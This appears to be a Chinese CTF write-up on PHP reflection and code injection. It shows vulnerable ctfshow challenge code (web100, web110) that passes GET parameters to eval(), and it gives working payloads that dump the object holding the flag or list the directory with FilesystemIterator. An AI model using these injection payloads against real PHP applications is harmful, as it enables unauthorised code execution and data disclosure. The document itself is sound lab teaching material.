<a href="https://www.cnblogs.com/bmjoker/p/9025351.html">由一道ctf学习变量覆盖漏洞</a>

<a href="https://blog.csdn.net/qq_45521281/article/details/105849770">变量覆盖漏洞总结</a>



<a href="https://blog.csdn.net/EasyTure/article/details/112603321">PHP反射类的使用方法、实现依赖注入</a>

<a href="https://blog.csdn.net/qq_49480008/article/details/113753951">推荐ctfshow php特性wp</a>

php反射类例子:
```php
<?php
class A{
public static $flag="flag{123123123}";
const  PI=3.14;
static function hello(){
    echo "hello</br>";
}
}
$a=new ReflectionClass('A');


var_dump($a->getConstants());  获取一组常量
输出
 array(1) {
  ["PI"]=>
  float(3.14)
}

var_dump($a->getName());    获取类名
输出
string(1) "A"

var_dump($a->getStaticProperties()); 获取静态属性
输出
array(1) {
  ["flag"]=>
  string(15) "flag{123123123}"
}

var_dump($a->getMethods()); 获取类中的方法
输出
array(1) {
  [0]=>
  object(ReflectionMethod)#2 (2) {
    ["name"]=>
    string(5) "hello"
    ["class"]=>
    string(1) "A"
  }
}

```


web100
```php
 <?php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}
?>

Notice: Undefined index: v1 in /var/www/html/index.php on line 17

Notice: Undefined index: v2 in /var/www/html/index.php on line 18

Notice: Undefined index: v3 in /var/www/html/index.php on line 19
```

payload:
```php
?v1=1&v2=var_dump($ctfshow)&v3=;
?v1=1&v2=echo new ReflectionClass&v3=;
```

web110
```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-29 22:49:10

*/


highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }

    eval("echo new $v1($v2());");

}

?>
```
payload:
```
?v1=FilesystemIterator&v2=getcwd
之后访问fl36dga.txt
```
